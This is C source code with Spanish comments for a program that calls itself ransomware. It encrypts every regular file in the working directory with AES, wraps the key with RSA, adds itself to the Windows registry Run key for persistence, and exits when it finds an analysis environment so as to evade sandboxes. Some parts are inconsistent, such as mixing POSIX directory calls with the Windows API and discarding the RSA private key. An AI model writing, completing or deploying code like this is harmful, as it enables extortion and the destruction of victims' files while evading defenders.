#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <windows.h>

#define SALT_SIZE 16
#define KEY_SIZE 32
#define IV_SIZE 16
#define RSA_KEY_SIZE 2048

const char *exclude_extensions[] = { ".exe", ".dll", ".sys" };

// Verifica si un archivo debe ser cifrado según su extensión
int should_encrypt(const char *filename) {
    for (int i = 0; i < sizeof(exclude_extensions) / sizeof(exclude_extensions[0]); ++i) {
        if (strstr(filename, exclude_extensions[i]) != NULL) {
            return 0;  // No cifrar
        }
    }
    return 1;  // Cifrar
}

// Verifica si el ransomware está en un entorno de análisis
int is_in_analysis_environment() {
    if (GetFileAttributes("C:\\path_to_virtual_environment") != INVALID_FILE_ATTRIBUTES) {
        return 1;  // Se detectó un entorno de análisis
    }
    return 0;  // No es un entorno de análisis
}

// Genera una clave simétrica para AES
void generate_aes_key(unsigned char *key) {
    RAND_bytes(key, KEY_SIZE);
}

// Cifra un archivo con AES
void aes_encrypt_file(const char *in_filename, const char *out_filename, unsigned char *key) {
    FILE *in_file = fopen(in_filename, "rb");
    FILE *out_file = fopen(out_filename, "wb");
    if (in_file == NULL || out_file == NULL) {
        printf("Error al abrir el archivo.\n");
        return;
    }

    unsigned char iv[IV_SIZE];
    RAND_bytes(iv, IV_SIZE);
    fwrite(iv, 1, IV_SIZE, out_file);  // Escribir IV en el archivo cifrado

    AES_KEY aes_key;
    AES_set_encrypt_key(key, 256, &aes_key);

    unsigned char in_data[AES_BLOCK_SIZE];
    unsigned char out_data[AES_BLOCK_SIZE];
    int num_bytes_read;

    while ((num_bytes_read = fread(in_data, 1, AES_BLOCK_SIZE, in_file)) > 0) {
        if (num_bytes_read < AES_BLOCK_SIZE) {
            memset(in_data + num_bytes_read, 0, AES_BLOCK_SIZE - num_bytes_read);
        }
        AES_cbc_encrypt(in_data, out_data, AES_BLOCK_SIZE, &aes_key, iv, AES_ENCRYPT);
        fwrite(out_data, 1, AES_BLOCK_SIZE, out_file);
    }

    fclose(in_file);
    fclose(out_file);
}

// Cifra la clave AES con la clave pública RSA
int rsa_encrypt_key(RSA *rsa, unsigned char *key, unsigned char *encrypted_key) {
    return RSA_public_encrypt(KEY_SIZE, key, encrypted_key, rsa, RSA_PKCS1_OAEP_PADDING);
}

// Genera un par de claves RSA
void generate_rsa_keys(RSA **rsa_private, RSA **rsa_public) {
    *rsa_private = RSA_generate_key(RSA_KEY_SIZE, RSA_F4, NULL, NULL);
    BIO *bio_public = BIO_new(BIO_s_mem());
    BIO *bio_private = BIO_new(BIO_s_mem());
    PEM_write_bio_RSA_PUBKEY(bio_public, *rsa_private);
    PEM_write_bio_RSAPrivateKey(bio_private, *rsa_private, NULL, NULL, 0, NULL, NULL);
    *rsa_public = PEM_read_bio_RSA_PUBKEY(bio_public, NULL, NULL, NULL);
    BIO_free(bio_public);
    BIO_free(bio_private);
}

// Agrega persistencia al ransomware en el sistema
void add_to_startup() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        const char *path_to_executable = "C:\\ruta\\ransomware.exe";
        RegSetValueEx(hKey, "RansomwareSimulator", 0, REG_SZ, (BYTE *)path_to_executable, strlen(path_to_executable) + 1);
        RegCloseKey(hKey);
    }
}

// Cifra todos los archivos en el directorio actual
void encrypt_files_in_directory(const char *password, RSA *rsa) {
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir(".")) != NULL) {
        unsigned char aes_key[KEY_SIZE];
        generate_aes_key(aes_key); // Genera la clave AES

        unsigned char encrypted_key[RSA_size(rsa)];
        rsa_encrypt_key(rsa, aes_key, encrypted_key); // Cifra la clave AES con RSA

        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG && should_encrypt(ent->d_name)) {
                char out_filename[256];
                snprintf(out_filename, sizeof(out_filename), "%s.enc", ent->d_name);

                // Cifrar el archivo
                aes_encrypt_file(ent->d_name, out_filename, aes_key);

                // Guardar la clave cifrada en un archivo
                FILE *key_file = fopen("encrypted_key.bin", "wb");
                if (key_file != NULL) {
                    fwrite(encrypted_key, 1, sizeof(encrypted_key), key_file);
                    fclose(key_file);
                }

                // Registrar el archivo cifrado
                FILE *log_file = fopen("ransomware.log", "a");
                if (log_file != NULL) {
                    fprintf(log_file, "Archivo cifrado: %s\n", ent->d_name);
                    fclose(log_file);
                }
            }
        }
        closedir(dir);
    } else {
        printf("Error al abrir el directorio.\n");
    }
}

int main() {
    // Comprobar si el script está en un entorno de análisis
    if (is_in_analysis_environment()) {
        printf("Entorno de análisis detectado. Salida.\n");
        return 0;
    }

    RSA *rsa_private = NULL;
    RSA *rsa_public = NULL;
    generate_rsa_keys(&rsa_private, &rsa_public); // Generar claves RSA

    // Añadir el ransomware al inicio del sistema
    add_to_startup();

    // Cifrar archivos en el directorio actual
    encrypt_files_in_directory("clave_secreta", rsa_public);

    printf("Todos los archivos cifrados.\n");

    RSA_free(rsa_private); // Liberar recursos RSA
    RSA_free(rsa_public);  // Liberar recursos RSA

    return 0;
}
